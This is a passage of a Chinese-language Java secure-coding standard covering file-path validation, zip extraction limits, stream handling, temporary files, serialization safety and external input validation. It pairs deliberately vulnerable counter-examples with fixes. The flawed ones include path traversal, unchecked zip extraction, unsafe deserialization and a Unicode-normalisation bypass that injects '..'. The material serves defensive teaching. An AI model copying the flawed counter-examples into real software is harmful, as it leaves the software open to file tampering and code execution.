1. **文件路径标准化**：对于文件路径的标准化必须使用 `getCanonicalPath()` 方法；
2. **文件路径校验**：必须针对标准化的文件路径进行校验。常用的校验方式是保证操作的文件在预 期目录下（例如使用`startsWith()`方法检查标准化文件路径是否以预期路径开头）。

说明： `getCanonicalPath()` 方法标准化的文件路径，文件目录会缺少末尾的文件路径分隔符，进行文 件路径校验时，要考虑该场景的影响，防止文件路径校验出现与预期不符的结果。

【反例】

```java
public void doSomething() {
    File file = new File(HOME_PATH, fileName);
    String path = file.getPath();
    if (!validatePath(path)) {
        throw new IllegalArgumentException("Path Traversal vulnerabilities may exist！");
    }
    ... // 对文件进行读写等操作
}

private boolean validatePath(String path) {
    return path.startsWith(HOME_PATH);
}
```

上述示例中，fileName来自外部输入，直接用fileName的值与固定路径进行拼接，作为实际访问文件 的路径，在访问文件之前通过 `validatePath` 检查了拼接的路径是否在固定目录下，但是攻击者可以通 过../这样的路径方式，访问HOME_PATH之外的任意文件。

【正例】

```java
public void doSomething() {
    File file = new File(HOME_PATH, fileName);
    try {
        String canonicalPath = file.getCanonicalPath();
        if (!validatePath(canonicalPath)) {
            throw new IllegalArgumentException("Path Traversal vulnerability!");
        }
        ... // 对文件进行读写等操作
    } catch (IOException ex) {
        throw new IllegalArgumentException("An exception occurred ...", ex);
    }
}

private boolean validatePath(String path) {
    return path.startsWith(HOME_PATH);
}
```

上述示例中，使用外部输入的fileName构造文件路径后，先对文件路径进行规范化，然后用规范化的文件路径进行校验，满足条件后执行文件读写操作。这样可以有效避免路径遍历之类的风险。 另外，要保证 `HOME_PATH` 以文件路径分隔符结尾，防止校验结果预期不符。例如当 `HOME_PATH` 为 `/a/b/c` ， `fileName` 为 `../cat/a.txt` ，标准化的文件路径 `path` 为 `/a/b/cat/a.txt` ， `path.startsWith(HOME_PATH)` 的结果为true，此校验结果将不符合预期。

> G.FIO.02 从ZipInputStream中解压文件必须进行安全检查

【级别】 要求

【描述】

使用 `java.util.zip.ZipInputStream` 解压zip文件时，可能会有两类安全风险：

1. **将文件解压到目标目录之外**
   压缩包中的文件名中如果包含 `..` ，可能导致文件被解压到目标目录之外，造成任意文件注入、文件恶意篡改等风险。因此，压缩包中的文件在解压前，要先对解压的目标路径进行校验，如果解压目标路径不在预期目录之内，要么拒绝将其解压出来，要么将其解压到一个安全的位置。
2. **解压的文件消耗过多的系统资源**
   zip压缩算法可能有很大的压缩比，可以把超大文件压缩成很小的zip文件（例如可以将上G的文件压缩为几K大小），这样的文件解压可能会导致zip炸弹（zip bomb）攻击。所以zip文件解压时，要对解压的实际文件大小进行检查，若解压之后的文件大小超过一定的限制，必须拒绝解压。具体的大小限制根据实际情况来确定。除此之外，解压时，还需要对解压出来的文件数量进行限制，防止zip压缩包中是数量巨大的小文件。

【反例】

```java
public void unzip(String fileName, String dir) throws IOException {
    try (FileInputStream fis = new FileInputStream(fileName);
         ZipInputStream zis = new ZipInputStream(fis)) {
        ZipEntry entry;
        File tempFile;
        byte[] buf = new byte[10240];
        int length;
        
        while ((entry = zis.getNextEntry()) != null) {
            tempFile = new File(dir, entry.getName());
            if (entry.isDirectory()) {
                tempFile.mkdirs();
                continue;
            }
            
            try (FileOutputStream fos = new FileOutputStream(tempFile)) {
                while ((length = zis.read(buf)) != -1) {
                    fos.write(buf, 0, length);
                }
            }
        }
    }
}
```

上述示例中，未对解压文件的操作做任何安全校验防护。

【正例】

```java
private static final long MAX_FILE_COUNT = 100L;
private static final long MAX_TOTAL_FILE_SIZE = 1024L * 1024L;
...
public void unzip(FileInputStream zipFileInputStream, String dir) throws IOException {
    long fileCount = 0;
    long totalFileSize = 0;
    try (ZipInputStream zis = new ZipInputStream(zipFileInputStream)) {
        ZipEntry entry;
        String entryName;
        String entryFilePath;
        File entryFile;
        byte[] buf = new byte[10240];
        int length;
        
        while ((entry = zis.getNextEntry()) != null) {
            entryName = entry.getName();
            entryFilePath = sanitizeFileName(entryName, dir);
            entryFile = new File(entryFilePath);
            
            if (entry.isDirectory()) {
                creatDir(entryFile);
                continue;
            }
            
            fileCount++;
            if (fileCount > MAX_FILE_COUNT) {
                throw new IOException("The ZIP package contains too many files.");
            }
            
            try (FileOutputStream fos = new FileOutputStream(entryFile)) {
                while ((length = zis.read(buf)) != -1) {
                    totalFileSize += length;
                    zipBombCheck(totalFileSize);
                    fos.write(buf, 0, length);
                }
            }
        }
    }
}

private String sanitizeFileName(String fileName, String dir) throws IOException {
    File file = new File(dir, fileName);
    String canonicalPath = file.getCanonicalPath();
    
    // dir的末尾缺少文件路径分隔符时，可能会导致校验错误。主动为dir参数末尾加上文件路径分隔符
    String safeDir = new File(dir).getCanonicalPath() + File.separator;
    
    if (canonicalPath.startsWith(safeDir)) {
        return canonicalPath;
    }
    throw new IOException("Path Traversal vulnerability: ...");
}

private void creatDir(File dirPath) throws IOException {
    boolean result = dirPath.mkdirs();
    if (!result) {
        throw new IOException("Create dir failed, path is : " + dirPath.getPath());
    }
    ...
}

private void zipBombCheck(long totalFileSize) throws IOException {
    if (totalFileSize > MAX_TOTAL_FILE_SIZEG) {
        throw new IOException("Zip Bomb! File size is too large. ...");
    }
}
```

上述示例中，在解压每个文件之前对其文件名进行校验，如果校验失败，整个解压过程会被终止。实际上也可以忽略跳过这个文件，继续后面的解压过程，甚至可以将这个文件解压到某个安全位置。解压缩过程中，在while循环中边读边统计实际解压出的文件总大小，如果达到指定的阈值（MAX_TOTAL_FILE_SIZE），会抛出异常终止解压操作；同时，会统计解压出来的文件的数量，如果达到指定阈值（MAX_FILE_COUNT），会抛出异常终止解压操作。

说明：在统计解压文件的大小时，不应该使用 `entry.getSize()` 来统计文件大小， `entry.getSize()`是从zip文件中的固定字段中读取单个文件压缩前的大小，文件压缩前的大小可被恶意篡改。

> G.FIO.03 对于从流中读取一个字符或字节的方法，使用int类型的返回值

【级别】 要求

【描述】

Java中 `InputStream.read()` 和 `Reader.read()` 方法用于从流中读取一个字节（byte）或字符（char）。

`InputStream.read()` 读取一个字节，返回值的范围为0x00-0xFF（补码），8位；`Reader.read()` 读取一个字符，返回值的范围为0x0000-0xFFFF（补码），16位。

当读取到流的末尾时，以上方法均返回int类型的-1（补码表示为0xFFFFFFFF），32位。

因此，如果在未判断返回值是否是流末尾标志-1（补码表示为0xFFFFFFFF）前将返回值转为byte或char，会导致无法正确判断返回值是流中的内容还是结束标识。

【反例】（字节）

```java
FileInputStream in = getReadableStream();
    
byte data;
while ((data = (byte) in.read()) != -1) {
    // 使用data
    ...
}
```

上述示例中，将 `read()` 方法返回的值直接转换为byte类型，并将转换后的结果与-1进行比较，进而判 断是否达到流的末尾。如果 `read()` 返回值为0xFF，0xFF转为有符号byte即为byte类型-1，循环结束条 件判断通过，结果就是错误的以为流结束了。

【反例】（字符）

```java
InputStreamReader in = getReader();

char data;
while ((data = (char) in.read()) != -1) {
    // 使用data
    ...
}
```

上述示例中，将 `read()` 方法返回的值直接转换为char类型，并将转换后的结果与-1进行比较，进而判 断是否达到流的末尾。当读取流结束后，返回值转为char类型后也不为-1，因此即使流读取结束， while循环仍无法正确终止。原因是流结束标志-1（补码表示为0xFFFFFFFF）被强转为char类型时，会 被转为0xFFFF，再和-1进行比较时等式不成立，导致循环结束条件永假。

【正例】（字节）

```java
FileInputStream in = getReadableStream();

byte data;
int result;
while ((result = in.read()) != -1) {
    data = (byte) result;
    // 使用data
    ...
}
```

【正例】（字符）

```java
InputStreamReader in = getReader();

char data;
int result;
while ((result = in.read()) != -1) {
    data = (char) result;
    // 使用data
    ...
}
```

上述示例中，使用int类型的变量来保存 read() 的返回值，并使用该返回值判断是否读取到流的末尾， 流未读完时，将读取的内容转换为char或者byte类型，这样就避免了判断流末尾不准确。

> G.FIO.04 防止外部进程阻塞在输入输出流上

【级别】 要求

【描述】

Java中有两种方式启动一个外部进程并与其交互： 

1. java.lang.Runtime的exec()方法； 
2. java.lang.ProcessBuilder的start()方法。

启动外部进程后会返回一个java.lang.Process对象，该对象封装了这个外部进程。每个Process对象， 包含输入流、输出流及错误流各一个，应该恰当地处理这些流，避免外部进程阻塞在这些流上，否则会导致异常、DoS及其他安全问题。

- 处理外部进程的输入流（ `Process.getOutputStream()` ，**从调用者角度来说，外部进程的输入流是OutputStream**）：对于需要输入流的外部进程，如果不为其提供一个有效输入，则其会从 一个空的输入流中读取输入，导致其一直阻塞。
- 处理外部进程的输出流（ `Process.getInputStream()` ）和错误流 （ `Process.getErrorStream()` ）：对于有输出流和错误流的外部进程，如果调用者不处理并且 清空对应流，则该外部进程的输出可能会耗尽该进程输出流与错误流的缓冲区，导致外部进程被调用者阻塞，并影响调用者与外部进程的正常交互。

如果使用 `java.lang.ProcessBuilder` 来调用外部进程，那么外部进程错误流可以通过 `redirectErrorStream()` 方法重定向到其输出流，调用者可以通过处理并清空输出流来同时处理错误流。

【反例】（错误处理外部进程的返回结果）

```java
public void execExtProcess() throws IOException {
    Process proc = Runtime.getRuntime().exec("ProcessMaybeStillRunning");
    int exitVal = proc.exitValue();
}
```

上述示例中，程序未等到ProcessMaybeStillRunning进程结束就调用 `exitValue()` 方法，很可能会导致`IllegalThreadStateException`异常。

【反例】（未处理外部进程的输出流、错误流）

```java
public void execExtProcess() throws IOException, InterruptedException {
    Process proc = Runtime.getRuntime().exec("ProcessHasOutput");
    int exitVal = proc.waitFor();
}
```

上述示例中，不会产生 `IllegalThreadStateException` 异常。但是由于没有处理ProcessHasOutput 的输出流和错误流，可能会导致主进程阻塞问题。

【正例】

```java
public class ProcessExecutor {
    public void callExtProcess() throws IOException, InterruptedException {
        Process proc = Runtime.getRuntime().exec("ProcessHasOutput");
        
        StreamConsumer errConsumer = new StreamConsumer(proc.getErrorStream());
        StreamConsumer outputConsumer = new StreamConsumer(proc.getInputStream());
        
        errConsumer.start();
        outputConsumer.start();
        
        int exitVal = proc.waitFor();
        
        errConsumer.join();
        outputConsumer.join();
    }
    
    class StreamConsumer extends Thread {
        InputStream is;
        
        StreamConsumer(InputStream is) {
            this.is = is;
        }
        
        @Override
        public void run() {
            try {
                byte data;
                int result;
                while ((result = is.read()) != -1) {
                    data = (byte) result;
                    handleData(data);
                }
            } catch (IOException ex) {
				// 处理异常
            }
        }
        
        private void handleData(byte data) {
			...
        }
    }
}
```

上述示例中，使用两个线程来分别读取进程的输出流和错误流。因此，外部进程不会被阻塞。

【例外】

对于外部进程不涉及使用输入流、输出流和错误流的场景，可以不对流进行专门处理。

> G.FIO.05 临时文件使用完毕必须及时删除

【级别】 要求

【描述】

程序中有很多使用临时文件的场景，比如用于进程间的数据共享，缓存内存数据，动态构造的类文件，动态连接库文件等。

临时文件可能创建于操作系统的共享临时文件目录，例如，POSIX系统下的/tmp 与/var/tmp目录，Windows系统下的C:\TEMP目录，这类目录中的文件可能会被定期清理。创建在其他路径下的临时文件不会被自动清理。

如果文件未被安全地创建或者用完后还是可访问的，具备本地文件 系统访问权限的恶意用户便可以利用共享目录中的文件进行恶意操作，另外，临时文件不清理也可能会 导致大量垃圾文件占用磁盘的存储空间。

删除已经不再需要的临时文件有助于对文件名和其他资源进行 回收利用。每一个程序在正常运行过程中都有责任确保已使用完毕的临时文件被删除。

【反例】

```java
public boolean uploadFile(InputStream in) throws IOException {
    File tempFile = File.createTempFile("test", ".tmp");
    try (FileOutputStream fop = new FileOutputStream(tempFile)) {
        int readSize;
        do {
            readSize = in.read(buffer, 0, MAX_BUFF_SIZE);
            if (readSize > 0) {
            	fop.write(buffer, 0, readSize);
            }
        } while (readSize >= 0);
        ... // 对tempFile进行其他操作
    }
}
```

上述示例中，在运行结束时未将临时文件删除。

【正例】

```java
public boolean uploadFile(InputStream in) throws IOException {
    File tempFile = File.createTempFile("test", ".tmp");
    try (FileOutputStream fop = new FileOutputStream(tempFile)) {
        int readSize;
        do {
            readSize = in.read(buffer, 0, MAX_BUFF_SIZE);
            if (readSize > 0) {
            	fop.write(buffer, 0, readSize);
            }
        } while (readSize >= 0);
        ... // 对tempFile进行其他操作
    } finally {
        if (!tempFile.delete()) {
        	// 忽略
        }
    }
}
```

上述示例中，在临时文件使用完毕后，在finally代码块中对其进行了删除处理。

### 3.11 序列化

> G.SER.01 尽量避免实现`Serializable`接口

【级别】 建议

【描述】

使用Java内置序列化功能的主要场景是为了在当前进程之外保存对象并在需要的时候重新获得对象。鉴于以下原因，建议除非必须使用的第三方接口要求必须实现`Serializable`接口，否则应选用其他方式代替。

- 序列化不必要地对外公开了对象的物理实现
- 序列化容易使一个类对其最初的内部表示产生依赖
- 编写正确的反序列化代码有很大的挑战
- 序列化增大了安全风险
- 序列化增加了测试的难度

综上，序列化耦合了对象的逻辑信息和物理实现，使得开发者在面对领域需求之外需要额外关注很多专有的细节知识。在可能的情况下，使用其他替代方案将会减少工作量、减少bug、降低出现安全漏洞的风险。

当必须实现`Serializable`接口时，class中涉及序列化的属性必须支持序列化操作。class中的静态属性、 transient修饰的非静态属性不会进行序列化，对于不需要序列化的属性可以通过这两种方式避免序列化，对于一些复杂场景，还可以通过添加 `readObject()` 、`writeObject()` 方法对序列化和反序列化 操作进行定制化操作。

> G.SER.02 实现Serializable接口的可序列化类应该显式声明serialVersionUID

【级别】 建议

【描述】

如果可序列化类未显式声明serialVersionUID，则序列化运行时将基于该类的各个方面计算该类的默认 serialVersionUID值，如“Java(TM) 对象序列化规范”中所述。

但是，强烈建议所有可序列化类都显式声 明serialVersionUID值，原因是计算默认的serialVersionUID对类的详细信息具有较高的敏感性，根据 编译器实现的不同可能千差万别，这样在反序列化过程中可能会导致意外的 `InvalidClassException` 。

因此，为保证serialVersionUID值跨不同java编译器实现的一致性，序列 化类必须声明一个明确的serialVersionUID值。

同时强烈建议使用private显式声明serialVersionUID，原因是这种声明仅应用于当前声明类， serialVersionUID作为继承成员没有用处。

【正例】

```java
public class BeanType implements Serializable {
    private static final long serialVersionUID = -2589766491699675794L;
    ...
}
```

> G.SER.03 序列化对象中的`HashMap`、`HashSet`或`HashTable`等集合禁止包含对象自身的引用

【级别】 要求

【描述】

如果一个被序列化的对象中包含`HashMap`、`HashSet`或`HashTable`集合，则这些集合中不允许保存当前被序列化对象的直接或间接引用。因为，这些集合类型在反序列化的时候，会调用到当前序列化对象的 hashCode方法，而此时（序列化对象还未完全加载）计算出的hashCode有可能不正确，从而导致对象放置位置错误，破坏反序列化的实例。

【反例】

```java
class Super implements Serializable {
    private static final long serialVersionUID = -2589766491699675794L;
    final Set<Super> set = new HashSet<>();
}

final class Sub extends Super {
    private int id;
    
    public Sub(int id) {
        this.id = id;
        set.add(this); // 集合中引用了当前对象
    }
    
    public void checkInvariant() {
        if (!set.contains(this)) {
            throw new AssertionError("invariant violated");
        }
    }
    
    public int hashCode() {
        return id;
    }
    
    public boolean equals(Object obj) {
        return obj instanceof Sub && id == ((Sub) obj).id;
    }
}
```

上述示例中，将当前对象（Sub对象）放入了对象中的HashSet中，在反序列化set时，因为id属性还未 完成初始化，导致hashCode的结果为0，从而导致Sub对象在set中的位置放置错误，对象被破坏。

> G.SER.04 禁止直接序列化指向系统资源的信息

【级别】 要求

【描述】

当序列化结果中含有指向系统的资源时，这些信息很容易被篡改。当恶意用户篡改了指向系统的资源时，反序列化的对象会直接操作这些被攻击者指定的系统资源，导致任意文件读取或修改。因此，建议 实现Serializable的类，其成员变量为File或FileDescriptor时，用transient修饰，避免这些对象被序列化。

指向系统资源的句柄如果必须序列化，可参考 G.SER.06 序列化操作要防止敏感信息泄露 中的要求进行防护，另外，反序列化来自外部的序列化数据构造的对象中的文件路径信息在使用前要进行校验。

【反例】

```java
final class SomeResource implements Serializable {
    private static final long serialVersionUID = -2589766491699675794L;
    File file;
    
    public SomeResource(String fileName) {
        file = new File(fileName);
		...
    }
}
```

【正例】

```java
final class SomeResource implements Serializable {
    private static final long serialVersionUID = 6562477636399915529L;
    transient File file;
    
    public SomeResource(String fileName) {
        file = new File(fileName);
		...
    }
}
```

> G.SER.05 禁止序列化非静态的内部类

【级别】 要求

【描述】

内部类是没有显式或隐式声明为静态的嵌套类。内部类（包括本地类和匿名类）的序列化很容易出错。

- 在使用非静态内部类时，实际上隐含着对外部类实例的非transient引用，在对内部类进行序列化 时，会一起将外部类也序列化。
- 内部类的实现与synthetic属性有关，对synthetic关键字，不同的编译器的实现不同，会影响程序 的兼容性。并且会跟默认的serialVersionID产生冲突。
- 内部类不能声明静态成员以外的运行时常量，所以不能使用serialPersistentFields机制来指定可以序列化的属性。
- 与外部实例关联的内部类没有无参构造方法（此内部类的构造方法隐式的接收外部实例作为前置参 数）。内部类无法实现Externalizable接口，Externalizable接口要求实现对象通过 `writeExternal()` 和 `readExternal()` 方法手动保存和恢复其状态。

基于以上原因，禁止序列化非静态内部类。但是这些原因不适用于静态内部类，所以静态内部类可以进行序列化。

【反例】

```java
public class SomeResource implements Serializable {
    private static final long serialVersionUID = -2589766491699675794L;
    private String fileName;
	...
        
    class InnerClass implements Serializable {
        private static final long serialVersionUID = 6562477636399915529L;
        private String name;
		...
    }
}
```

上述示例中，内部类序列化时，外部类中的属性也将被序列化。

【正例】

```java
public class SomeResource implements Serializable {
    private static final long serialVersionUID = 3938280590455555273L;
    private String fileName;
	...
        
    static class InnerClass implements Serializable {
        private static final long serialVersionUID = 6562477636399915529L;
        private String name;
		...
    }
}
```

上述示例中，内部类声明为静态内部类，序列化时不会序列化外部类。

> G.SER.06 序列化操作要防止敏感信息泄露

【级别】 要求

【描述】

序列化操作是将一个对象转换为一个字节码或字符序列，该过程中，默认是没有进行安全防护的，数据都是明文的。当序列化结果中含有敏感信息时，序列化结果在磁盘上存储、跨信任域传递等操作都存在 敏感信息泄露风险。所以在序列化操作中，应该避免序列化敏感信息， 如果敏感信息必须序列化，需要 先对敏感信息进行加密或对序列化结果进行加密，跨信任边界传递含敏感信息的序列化结果时需要先签名后加密。

【反例】

```java
public class UserInfo implements Serializable {
    private static final long serialVersionUID = 6562477636399915529L;
    private String id;
    private String name;
    private String phone;
    private String address;
	...
}

public void saveUserInfoToFile(UserInfo info) {
	...
    FileOutputStream fos = null;
    try {
        fos = new FileOutputStream("bizFile");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(info);
        ...
    } catch (IOException ex) {
        // 处理异常
    }
    ...
}
```

上述示例中，直接将含有电话、住址等敏感信息的用户序列化写入磁盘中，存在敏感信息泄露的风险。

【正例】（transient）

```java
public class UserInfo implements Serializable {
    private static final long serialVersionUID = -2589766491699675794L;
    private String id;
    private String name;
    private transient String phone;
    private transient String address;
    ...
}
```

上述示例中，使用transient关键词修饰含敏感信息的属性，避免这些属性进行序列化。transient关键 字对于fastjson、Gson等常用的json组件同样有效。

【正例】（对敏感属性加密）

```java
public class UserInfo implements Serializable {
    private static final long serialVersionUID = -2589766491699675794L;
    private String id;
    private String name;
    private String phone;
    private String address;
	...
    private void writeObject(ObjectOutputStream outputStream) throws IOException {
        outputStream.writeObject(id);
        outputStream.writeObject(name);
        outputStream.writeObject(encryptData(phone));
        outputStream.writeObject(encryptData(address));
    }
}

public void saveUserInfoToFile(UserInfo info) {
	...
    FileOutputStream fos = null;
    try {
        fos = new FileOutputStream("bizFile");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(info);
        ...
    } catch (IOException ex) {
        // 处理异常
    }
    ...
}
```

上述示例中，序列化前对其中的敏感信息进行了加密处理。

对于使用fastjson组件对对象进行序列化处理，可以在需要加密的属性对应的`getXxx()`方法中对该属性进行加密处理。

【正例】（对序列化结果先签名后加密）

```java
public void sendUserInfoOverNetwork(UserInfo info) {
	...
    try {
        ...
            String json = JSON.toJSONString(info);
        String signJson = sign(json);
        String encryptJson = encrypt(signJson);
        // 发送加密后的json
        ...
    } catch (IOException ex) {
        // 处理异常
    }
    ...
}
```

上述示例中，需要跨网络传递UserInfo对象，为了防止UserInfo中的敏感信息被篡改、泄露，对 UserInfo对象的序列化结果，先签名后加密，最后对最终结果进行网络传递。

> G.SER.07 防止反序列化被利用来绕过构造方法中的安全操作

【级别】 要求

【描述】

反序列化操作可以在不执行构造方法的情况下创建对象的实例，所以反序列化操作中的行为应该设计为与构造方法保持一致，这些行为包括：

- 对参数的校验；
- 安全管理器的检查；
- 对属性赋初始值，特别是transient修饰的属性反序列化操作默认不会赋值；

否则，攻击者就可能会通过反序列化操作构造出与预期不符合的对象实例。

【反例】

```java
public class MySerializeDemo implements Serializable {
    private static final long serialVersionUID = -2349905535321929112L;
    private static final int DEFAULT_VALUE = 0;
    private int value;
    
    public MySerializeDemo(int data) {
		// 赋值前先进行检查
        if (data >= 0) {
            this.value = data;
        } else {
            this.value = DEFAULT_VALUE;
        }
    }
    
    private void readObject(ObjectInputStream in)
            throws IOException, ClassNotFoundException {
        ObjectInputStream.GetField field = in.readFields();
        value = field.get("value", 0);
    }
}
```

上述示例中，构造方法会对参数进行检查，保证value的值为非负值，但是通过反序列化操作可构造 value值为负值的对象实例。

【正例】

```java
public class MySerializeDemo implements Serializable {
    private static final long serialVersionUID = -2349905535321929112L;
    private static final int DEFAULT_VALUE = 0;
    private int value;
    
    public MySerializeDemo(int data) {
		// 赋值前先进行检查
        if (data >= 0) {
            this.value = data;
        } else {
            this.value = DEFAULT_VALUE;
        }
    }
    
    private void readObject(ObjectInputStream in)
            throws IOException, ClassNotFoundException {
        ObjectInputStream.GetField field = in.readFields();
        int data = field.get("value", 0);
        if (data >= 0) {
            this.value = data;
        } else {
            this.value = DEFAULT_VALUE;
        }
    }
}
```

上述示例中，在反序列化操作中与构造方法中对value赋值操作保持一致，先检查值为非负值后再赋给 value。

【反例】

```java
public class SecureSerializeDemo implements Serializable {
    private static final long serialVersionUID = 7727894840251340298L;
    
    public SecureSerializeDemo() {
		// 实例化敏感类需要权限
        securityManagerCheck();
        // 常规逻辑流程
        ...
    }
    
    private void readObject(ObjectInputStream in) {
        // 常规逻辑流程
        ...
    }
    
    private void securityManagerCheck() {
        // 权限安全检查
        ...
    }
}
```

上述示例中，安全管理器检查被应用在构造器中，但在反序列化涉及的 `readObject()` 方法中没有用 到。这样会导致通过反序列化操作构造出不满足安全检查条件的对象实例。

【正例】

```java
public class SecureSerializeDemo implements Serializable {
    private static final long serialVersionUID = 7727894840251340298L;
    
    public SecureSerializeDemo() {
		// 实例化敏感类需要权限
        securityManagerCheck();
        // 常规逻辑流程
        ...
    }
    
    private void readObject(ObjectInputStream in) {
        // 实例化敏感类需要权限
        securityManagerCheck();
        // 常规逻辑流程
        ...
    }
    
    private void securityManagerCheck() {
        // 权限安全检查
        ...
    }
}
```

上述示例中，在构造方法和反序列化的 `readObject()` 方法中执行了相同的安全检查，保证了系统中所 有构造出的对象实例都是符合安全要求的。

> G.SER.08 禁止直接将外部数据进行反序列化

【级别】 要求

【描述】

反序列化操作是将一个二进制流或字符串反序列化为一个Java对象。当反序列化操作的数据是外部数据时，恶意用户可利用反序列化操作构造指定的对象、执行恶意代码、向应用程序中注入有害数据等。不安全反序列化操作可能导致任意代码执行、特权提升、任意文件访问、拒绝服务等攻击。

实际应用中，通常采用三方件实现对json、xml、yaml格式的数据序列化和反序列化操作。常用的三方件包括：fastjson、jackson、XMLDecoder、XStream、SnakeYmal等。对于常见三方件的不安全反序列化的防护操作可参考 java反序列化漏洞研究。

【反例】

```java
public class DeserializeExample implements Serializable {
    private static final long serialVersionUID = -5809782578272943999L;
    private String name;
    
    public String getName() {
        return name;
    }
    
    public void setName(String name) {
        this.name = name;
    }
    
    private void readObject(java.io.ObjectInputStream ois) {
        ois.defaultReadObject();
        System.out.println("Hack!");
    }
}

// 使用外部数据执行反序列化操作
ObjectInputStream ois2= new ObjectInputStream(fis);
PersonInfo myPerson = (PersonInfo) ois2.readObject();
```

上述示例中，当反序列化操作的对象是攻击者构造的DeserializeExample对象的序列化结果，当 `PersonInfo myPerson = (PersonInfo) ois2.readObject()` 语句执行时会报错（类型转换错误），但是DeserializeExample对象中的 `readObject()` 方法会先执行。

【正例】（使用白名单校验）

```java
public final class SecureObjectInputStream extends ObjectInputStream {
    public SecureObjectInputStream() throws SecurityException, IOException {
        super();
    }
    
    public SecureObjectInputStream(InputStream in) throws IOException {
        super(in);
    }
    
    protected Class<?> resolveClass(ObjectStreamClass desc)
            throws IOException, ClassNotFoundException {
        if (!desc.getName().equals("com.huawei.PersonInfo")) { // 白名单校验
            throw new ClassNotFoundException(desc.getName() + " not find");
        }
        return super.resolveClass(desc);
    }
}
```

上述示例中，对反序列化的类进行白名单检查。即在自定义ObjectInputStream中重载 `resolveClass()` 方法，对className进行白名单校验。如果反序列化的类不在白名单之中，直接抛出异常。

【正例】（使用安全管理器防护）

如果产品已经使用Java的安全管理器，建议使用Java安全管理器机制进行防护。

1. 设置enableSubclassImplementation

```java
permission java.io.SerializablePermission "enableSubclassImplementation";
```

2. 定义ObjectInputStream，重载resolveClass的方法

```java
public final class HWObjectInputStream extends ObjectInputStream {
    public HWObjectInputStream() throws SecurityException, IOException {
        super();
    }
    public HWObjectInputStream(InputStream in) throws IOException {
        super(in);
    }
    protected Class<?> resolveClass(ObjectStreamClass desc)
            throws IOException, ClassNotFoundException {
        SecurityManager sm = System.getSecurityManager();
        if (sm != null) {
            sm.checkPermission(new SerializablePermission(
                    "com.hw." + desc.getName()));
        }
        return super.resolveClass(desc);
    }
}
```

3. 在policy文件里设置白名单

```java
permission java.io.SerializablePermission "com.hw.PersonInfo";
```

### 3.12 外部数据校验

> P.05 外部数据使用前必须进行合法性校验

【描述】

外部数据的范围包括但不限于：网络、用户输入（包括命令行、界面）、命令行、文件（包括程序的配 置文件）、环境变量、进程间通信（包括管道、消息、共享内存、socket等、RPC）、跨信任域方法参 数（对于API）等。

来自程序外部的数据通常被认为是不可信的，在使用这些数据前需要进行合法性校验，否则可能会导致不正确的计算结果、运行时异常、不一致的对象状态，甚至引起各种注入攻击，对系统造成严重影响。 对于外部数据的具体校验，要结合实际的业务场景采用与之相对的校验方式来消除安全隐患；对于缺少 校验规则的场景，可结合其他的措施进行防护，保证不会存在安全隐患。

**对外部数据的校验包括但不局限于**：

- 校验API接口参数合法性；
- 校验数据长度；
- 校验数据范围；
- 校验数据类型和格式；
- 校验集合大小；
- 校验外部数据只包含可接受的字符（白名单校验），尤其需要注意一些特殊情况下的特殊字符，例如 附录A 和 附录B。

对于外部数据的校验，要注意以下两点：

- 如果需要，外部数据校验前要先进行标准化：例如“\uFE64”、“<”都可以表示“<”，在web应用中， 如果外部输入不做标准化，可以通过“\uFE64”绕过对“<”限制。
- 对外部数据的修改要在校验前完成，保证实际使用的数据与校验的数据一致。

【反例】

```java
public void doSomething() {
	...
    File file = new File(HOME_PATH, fileName);
    try {
        String canonicalPath = file.getCanonicalPath();
        if (!validatePath(canonicalPath)) {
            throw new IllegalArgumentException("Path Traversal vulnerability!");
        }
        
        String normalizePath = Normalizer.normalize(canonicalPath, Form.NFKC);
        File newFile = new File(normalizePath);
        fd = new FileOutputStream(newFile);
        ...
    } catch (IOException ex) {
        throw new IllegalArgumentException("An exception occurred ...", ex);
    }
}
```

上述代码中，文件路径校验之后，对标准化的文件路径字符串进行了标准化（Normalize）处理，然后 再构造 `File` 对象进行文件操作。这样的代码逻辑，进行校验的文件路径与最终使用的文件路径是不同的，代码中仍存在路径遍历风险，恶意用户可以通过 `\u2024\u2024` 这样的方式向最终使用的文件路径 中注入 `..` ，以此实现对路径遍历漏洞的利用。

出于性能和代码简洁性考虑，对于RESTful API，provider只校验请求信息，consumer只校验响应结 果；对于一个调用链上的方法，最外层的对外public方法必须校验，内部public方法可不重复校验。

常见校验框架：

接口：JSR 380（Bean Validation 2.0）、JSR 303（Bean Validation 1.0）JavaBean参数校验标准，核心接口javax.validation.Validator，定义了很多常用的校验注解。

实现：hibernate-validator 、Spring：

- hibernate-validator 是 JSR 380（Bean Validation 2.0）、JSR 303（Bean Validation 1.0）规范 的实现，同时扩展了注解：@Email、@Length、@NotEmpty、@Range等。
- Spring Validator 同样实现了JSR 380和JSR 303，并提供了MethodValidationPostProcessor类， 用于对方法的校验。 产品可自主选择合适的校验框架，也可以自主开发实现外部数据校验。

【反例】

```java
@RequestMapping(value = "/updating", method = RequestMethod.POST)
public boolean updateCompany(@RequestBody Companies companies) {
    return employeeService.updateCompany(companies.getSrcCompany(),
    	companies.getDestCompany());
}
```

上述示例中，provider对外开放的 `updateCompany()` 接口未对请求体做校验，存在被恶意攻击的风险。

【正例】

```java
@RequestMapping(value = "/updating", method = RequestMethod.POST)
public boolean updateCompany(@RequestBody @Valid @NotNull Companies companies) {
    return employeeService.updateCompany(
        companies.getSrcCompany(), companies.getDestCompany());
}

@Setter
@Getter
public class Companies {
    @Valid
    @NotNull
    private Company srcCompany;
    
    @Valid
    @NotNull
    private Company destCompany;
}

@Setter
@Getter
@Accessors(chain = true)
public class Company {
    @NotBlank
    @Size(min = 10, max = 256)
    private String name;
    
    @NotBlank
    @Size(min = 10, max = 512)
    private String address;
    
    @Valid
    private SubCompany subCompany;
}
```

上述示例中，使用@Valid注解触发参数校验，校验逻辑为对象属性声明时通过注解指定的规则。对外接口内部调用的public方法 `employeeService.updateCompany()` 由于只有本模块使用，非对外接口，而 且调用的地方已做参数校验，可以不做参数判断。

【反例】

```java
public static String getFile(String filePath, String fileName) {
    // 获取进程的classpath路径
    String path = System.getProperty(RUNTIME_BASE_DIR);
    ... // 直接使用
}
```

上述示例中，获取环境变量值后未校验，直接使用。

【正例】

使用ClassLoader提供的 `getResource()` 和 `getResourceAsStream()` 从装载的类路径中取得资源。

```java
public static String getSavePath(String filePath, String fileName) {
	return ClassLoader.getSystemResource(fileName).getPath();
}
```

对环境变量的值先进行标准化处理，再执行校验，最后使用：

```java
public static String getFile(String filePath, String fileName) {
    // 获取进程的classpath路径
